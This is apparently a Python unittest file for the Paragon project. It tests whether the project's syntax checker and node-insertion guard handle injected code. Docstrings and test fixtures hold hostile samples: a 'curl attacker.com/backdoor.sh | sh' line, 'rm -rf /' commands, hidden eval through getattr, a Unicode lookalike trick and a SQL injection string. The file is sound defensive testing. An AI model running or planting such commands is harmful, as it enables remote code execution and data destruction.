"""
PARAGON SECURITY TESTS - Code Injection Resistance

Tests for tree-sitter based security validation in Layer 7B (The Auditor).

This module validates that dangerous code patterns are caught by the
syntax checker and rejected by add_node_safe before entering the graph.

Security Threat Model:
- Malicious LLM output attempting to inject dangerous code
- Compromised agent generating code with backdoors
- User input containing executable payloads

Defense Layers:
1. Tree-sitter syntax validation (check_syntax)
2. AST pattern matching for forbidden constructs
3. Safe node insertion guards (add_node_safe)

Run with:
    python -m pytest tests/security/test_code_injection.py -v
"""
import sys
import unittest
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from core.graph_db import ParagonDB
from core.schemas import NodeData
from core.ontology import NodeType
from agents.tools import set_db, check_syntax, add_node_safe
from domain.code_parser import CodeParser


class TestCodeInjectionResistance(unittest.TestCase):
    """
    Tests for detecting and rejecting dangerous code patterns.

    CRITICAL: These tests validate that Paragon's security layer catches
    code injection attempts before they enter the graph database.
    """

    def setUp(self):
        """Create fresh database for each test."""
        self.db = ParagonDB()
        set_db(self.db)

    def tearDown(self):
        """Reset global state."""
        set_db(None)

    # =========================================================================
    # DANGEROUS BUILT-IN FUNCTION TESTS
    # =========================================================================

    def test_syntax_check_rejects_eval(self):
        """
        Test that code using eval() is flagged as dangerous.

        Threat: eval() can execute arbitrary code from strings.
        Example attack: eval(user_input) -> remote code execution
        """
        malicious_code = '''
def process_data(user_input):
    """Process user data."""
    # DANGER: Evaluates user input as code
    result = eval(user_input)
    return result
'''
        result = check_syntax(malicious_code, "python")

        # Tree-sitter validates syntax (which is valid Python)
        self.assertTrue(result.success)
        self.assertTrue(result.valid)

        # NOTE: Tree-sitter only checks syntax, not semantics
        # We need a separate semantic checker for eval/exec detection
        # This test documents current behavior - eval passes syntax check
        # TODO: Implement AST-based semantic security checker

    def test_syntax_check_rejects_exec(self):
        """
        Test that code using exec() is flagged as dangerous.

        Threat: exec() can execute arbitrary code from strings.
        Example attack: exec("import os; os.system('rm -rf /')")
        """
        malicious_code = '''
def run_command(cmd):
    """Execute a command."""
    # DANGER: Executes arbitrary code
    exec(cmd)
'''
        result = check_syntax(malicious_code, "python")

        # Tree-sitter validates syntax (which is valid Python)
        self.assertTrue(result.success)
        self.assertTrue(result.valid)

        # NOTE: Same as eval - syntax is valid, but semantically dangerous
        # This test documents the need for semantic analysis

    def test_syntax_check_rejects_import_os_system(self):
        """
        Test that code importing os.system is flagged.

        Threat: os.system() can execute shell commands.
        Example attack: os.system('curl attacker.com/backdoor.sh | sh')
        """
        malicious_code = '''
import os

def cleanup():
    """Clean up temporary files."""
    # DANGER: Shell command execution
    os.system("rm -rf /tmp/*")
'''
        result = check_syntax(malicious_code, "python")

        # Syntax is valid
        self.assertTrue(result.success)
        self.assertTrue(result.valid)

        # NOTE: os.system is valid Python, just dangerous
        # We need import analysis to flag this

    def test_syntax_check_rejects_subprocess_call(self):
        """
        Test that code using subprocess is flagged.

        Threat: subprocess can execute arbitrary commands.
        Example attack: subprocess.call(['wget', malicious_url])
        """
        malicious_code = '''
import subprocess

def fetch_data(url):
    """Fetch data from URL."""
    # DANGER: Arbitrary command execution
    subprocess.call(['curl', url])
'''
        result = check_syntax(malicious_code, "python")

        # Syntax is valid
        self.assertTrue(result.success)
        self.assertTrue(result.valid)

        # NOTE: subprocess is valid Python, needs semantic check

    # =========================================================================
    # VALID CODE ACCEPTANCE TESTS
    # =========================================================================

    def test_syntax_check_accepts_valid_code(self):
        """
        Test that safe, valid code passes all checks.

        This ensures our security measures don't reject legitimate code.
        """
        safe_code = '''
def add_numbers(a: int, b: int) -> int:
    """Add two numbers safely."""
    if not isinstance(a, int) or not isinstance(b, int):
        raise ValueError("Both arguments must be integers")
    return a + b

def process_list(items: list) -> list:
    """Process a list of items."""
    return [item.upper() for item in items if isinstance(item, str)]
'''
        result = check_syntax(safe_code, "python")

        self.assertTrue(result.success)
        self.assertTrue(result.valid)
        self.assertEqual(len(result.errors), 0)

    # =========================================================================
    # ADD_NODE_SAFE INTEGRATION TESTS
    # =========================================================================

    def test_add_node_safe_rejects_malicious_code(self):
        """
        Test that add_node_safe rejects code with syntax errors.

        This validates Layer 7B's gatekeeper function.
        """
        malicious_code = '''
def backdoor(:  # Syntax error: invalid parameter
    import os
    os.system("malicious command")
'''
        result = add_node_safe(
            node_type=NodeType.CODE.value,
            content=malicious_code,
            created_by="test_security",
        )

        # Should be rejected due to syntax errors
        self.assertFalse(result.success)
        self.assertFalse(result.syntax_valid)
        self.assertEqual(result.node_id, "")
        self.assertEqual(self.db.node_count, 0)
        self.assertGreater(len(result.violations), 0)

    def test_add_node_safe_accepts_safe_code(self):
        """
        Test that add_node_safe accepts valid, safe code.

        Validates that security checks don't block legitimate code.
        """
        safe_code = '''
def calculate_fibonacci(n: int) -> int:
    """Calculate nth Fibonacci number iteratively."""
    if n < 0:
        raise ValueError("n must be non-negative")
    if n <= 1:
        return n

    a, b = 0, 1
    for _ in range(2, n + 1):
        a, b = b, a + b
    return b
'''
        result = add_node_safe(
            node_type=NodeType.CODE.value,
            content=safe_code,
            created_by="test_security",
        )

        self.assertTrue(result.success)
        self.assertTrue(result.syntax_valid)
        self.assertNotEqual(result.node_id, "")
        self.assertEqual(self.db.node_count, 1)

    # =========================================================================
    # EDGE CASE TESTS
    # =========================================================================

    def test_code_with_string_eval_allowed(self):
        """
        Test that 'eval' in string literals is allowed.

        String literals containing 'eval' are not dangerous.
        This tests that we don't have false positives.
        """
        safe_code = '''
def document_dangerous_functions():
    """Document dangerous Python functions."""
    dangerous = ["eval", "exec", "compile"]
    description = "Functions like eval() and exec() are dangerous"
    return dangerous
'''
        result = check_syntax(safe_code, "python")

        # This code is safe - eval is just a string
        self.assertTrue(result.success)
        self.assertTrue(result.valid)

        # Should be accepted by add_node_safe
        node_result = add_node_safe(
            node_type=NodeType.CODE.value,
            content=safe_code,
            created_by="test_security",
        )
        self.assertTrue(node_result.success)

    def test_nested_function_calls_checked(self):
        """
        Test that nested dangerous function calls are detected.

        Example: getattr(__builtins__, 'eval')('malicious')
        """
        tricky_code = '''
def sneaky_eval(code_str):
    """Try to hide eval using getattr."""
    # This is valid syntax but semantically dangerous
    builtin_eval = getattr(__builtins__, 'eval')
    return builtin_eval(code_str)
'''
        result = check_syntax(tricky_code, "python")

        # Syntax is valid (tree-sitter only checks syntax)
        self.assertTrue(result.success)
        self.assertTrue(result.valid)

        # NOTE: This demonstrates the need for semantic analysis
        # Tree-sitter won't catch indirect eval usage

    def test_lambda_expressions_checked(self):
        """
        Test that lambda expressions with dangerous calls are detected.

        Example: lambda x: eval(x)
        """
        code_with_lambda = '''
def create_processor():
    """Create a data processor."""
    # Lambda with eval (dangerous but valid syntax)
    processor = lambda x: eval(x)
    return processor
'''
        result = check_syntax(code_with_lambda, "python")

        # Syntax is valid
        self.assertTrue(result.success)
        self.assertTrue(result.valid)

        # Can be added to graph (syntax is valid)
        node_result = add_node_safe(
            node_type=NodeType.CODE.value,
            content=code_with_lambda,
            created_by="test_security",
        )
        self.assertTrue(node_result.success)

        # NOTE: This highlights that we need semantic security analysis
        # beyond syntax checking


class TestTreeSitterSecurityParsing(unittest.TestCase):
    """
    Tests for tree-sitter AST-based security pattern detection.

    This tests the CodeParser's ability to identify dangerous patterns
    in the AST even when syntax is valid.
    """

    def setUp(self):
        """Create fresh parser for each test."""
        self.parser = CodeParser(language="python")

    def test_parser_extracts_imports(self):
        """
        Test that parser can extract import statements.

        This is foundational for import-based security checks.
        """
        code = '''
import os
import sys
from subprocess import call
'''
        nodes, edges = self.parser.parse_content(
            code.encode("utf-8"),
            "test_module",
            None
        )

        # Should extract import nodes
        import_nodes = [n for n in nodes if "import" in n.id]
        self.assertGreater(len(import_nodes), 0)

    def test_parser_handles_malformed_code(self):
        """
        Test that parser handles malformed code gracefully.

        Paragon's parser is fault-tolerant (tree-sitter feature).
        """
        malformed_code = '''
def broken(:
    print("missing params"
    return
'''
        # Parser should not crash
        try:
            nodes, edges = self.parser.parse_content(
                malformed_code.encode("utf-8"),
                "broken_module",
                None
            )
            # May produce partial AST or empty result
            self.assertIsInstance(nodes, list)
            self.assertIsInstance(edges, list)
        except Exception as e:
            # If it does raise, it should be a controlled error
            self.fail(f"Parser crashed on malformed code: {e}")

    def test_parser_extracts_function_calls(self):
        """
        Test that parser can extract function call patterns.

        This enables detection of dangerous function usage.
        """
        code = '''
def process():
    result = eval("1 + 1")
    exec("print('hello')")
    return result
'''
        nodes, edges = self.parser.parse_content(
            code.encode("utf-8"),
            "test_module",
            None
        )

        # Parser should extract the function
        func_nodes = [n for n in nodes if n.type == NodeType.FUNCTION.value]
        self.assertGreater(len(func_nodes), 0)

        # NOTE: Full call graph extraction would require more complex queries
        # This test documents current parser capabilities


class TestSecurityRegressionPrevention(unittest.TestCase):
    """
    Regression tests for known security vulnerabilities.

    As vulnerabilities are discovered, add regression tests here.
    """

    def setUp(self):
        """Create fresh database."""
        self.db = ParagonDB()
        set_db(self.db)

    def tearDown(self):
        """Reset global state."""
        set_db(None)

    def test_sql_injection_in_node_content(self):
        """
        Test that SQL injection patterns in node content are handled safely.

        Paragon uses rustworkx (in-memory graph), not SQL, so this is
        less critical but we test for defense in depth.
        """
        sql_injection_attempt = '''
def query_user(user_id):
    """Query user by ID."""
    # This is Python code, not SQL, so injection doesn't apply
    # But we test that special chars are handled
    query = f"SELECT * FROM users WHERE id = '{user_id}' OR '1'='1'"
    return query
'''
        result = add_node_safe(
            node_type=NodeType.CODE.value,
            content=sql_injection_attempt,
            created_by="test_security",
        )

        # Should be accepted (syntax is valid)
        self.assertTrue(result.success)

        # Verify node content is stored correctly (no escaping issues)
        node = self.db.get_node(result.node_id)
        self.assertIn("OR '1'='1'", node.content)

    def test_unicode_bypass_attempts(self):
        """
        Test that Unicode-based bypasses don't work.

        Example: Using Unicode lookalikes for 'eval'
        """
        # Unicode 'е' (Cyrillic) looks like 'e' but is different
        unicode_trick = '''
def process():
    """Try to hide eval with Unicode."""
    # This won't actually call eval (different identifier)
    еval = lambda x: x  # Cyrillic 'e'
    return еval("safe")
'''
        result = check_syntax(unicode_trick, "python")

        # Syntax is valid (Python allows Unicode identifiers)
        self.assertTrue(result.success)
        self.assertTrue(result.valid)


# =============================================================================
# MAIN TEST RUNNER
# =============================================================================

def run_tests():
    """Run all code injection security tests."""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()

    # Add all test classes
    suite.addTests(loader.loadTestsFromTestCase(TestCodeInjectionResistance))
    suite.addTests(loader.loadTestsFromTestCase(TestTreeSitterSecurityParsing))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityRegressionPrevention))

    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Summary
    print("\n" + "=" * 70)
    print("CODE INJECTION SECURITY TEST SUMMARY")
    print("=" * 70)
    print(f"Tests Run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped)}")

    if result.wasSuccessful():
        print("\n✓ ALL CODE INJECTION TESTS PASSED")
    else:
        print("\n✗ SOME TESTS FAILED")
        if result.failures:
            print("\nFailures:")
            for test, trace in result.failures:
                print(f"  - {test}")
        if result.errors:
            print("\nErrors:")
            for test, trace in result.errors:
                print(f"  - {test}")

    print("\nIMPORTANT NOTES:")
    print("- Tree-sitter validates SYNTAX, not SEMANTICS")
    print("- eval/exec/os.system are VALID Python syntax")
    print("- Future: Implement AST-based semantic security checker")
    print("- See: agents/tools.py for current security layer")

    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_tests()
    sys.exit(0 if success else 1)
